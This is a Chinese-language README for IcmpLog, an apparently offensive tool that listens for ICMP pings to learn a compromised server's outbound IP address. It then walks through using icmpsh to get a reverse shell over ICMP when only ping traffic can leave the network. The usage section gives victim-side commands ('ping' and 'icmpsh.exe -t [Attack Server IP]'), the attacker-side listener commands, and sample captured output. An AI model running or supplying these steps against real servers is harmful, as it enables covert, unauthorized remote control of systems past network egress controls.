# IcmpLog
一个监听icmp请求的小程序
- 用于只在ping出网的情况下获取服务器的出口地址。
- 可以配合[icmpsh](https://github.com/bdamele/icmpsh)实现仅在Icmp出网的情况下获取服务器反弹shell

## 使用
攻击端执行
```
{21-07-08 16:04}mail:~ root# ./icmplog [Attack Server IP]
```
[Attack Server IP]为要监听的服务端IP地址
被攻击机执行
```
ping [Attack Server IP]
```
服务端回显
```
2021/07/08 16:04:44 message = '', length = 0, source-ip = *.*.*.109
2021/07/08 16:04:45 message = '', length = 0, source-ip = *.*.*.109
2021/07/08 16:04:46 message = '', length = 0, source-ip = *.*.*.109
2021/07/08 16:04:47 message = '', length = 0, source-ip = *.*.*.109
```
之后利用icmpsh
被攻击机执行
```
.\icmpsh.exe -t [Attack Server IP]
```
攻击机执行
```
python2.7 icmpsh_m.py [Attack Server IP] *.*.*.109
```
即可获取反连的webshell
